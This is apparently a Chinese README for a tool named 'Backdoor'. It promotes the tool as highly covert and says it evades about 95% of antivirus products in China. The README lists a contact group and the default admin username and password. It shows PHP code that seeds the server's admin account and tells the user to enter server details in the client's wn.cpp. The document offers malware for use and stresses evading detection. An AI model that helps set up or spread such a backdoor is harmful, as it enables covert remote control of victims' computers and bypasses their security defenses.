Backdoor
技术交流群1048879748
本程序是一个隐蔽性极强的"后门程序” 几乎绕过了中国地区95%的杀毒软件
你需要在服务器上配置服务端，这里不再赘述，此外默认用户名和密码分别是Buyt和1048879748，你可以在
        $stmt = $pdo->query('SELECT COUNT(*) FROM admins');
        if ((int)$stmt->fetchColumn() === 0) {
            $hash = password_hash('1048879748', PASSWORD_DEFAULT);
            $pdo->prepare('INSERT INTO admins (username, password_hash) VALUES (?, ?)')
                ->execute(['Buyt', $hash]);
        }
    } catch (PDOException $e) {
        die('Database connection failed: ' . $e->getMessage());
    }
这部分进行修改
然后在客户端的wn.cpp中填写服务器信息
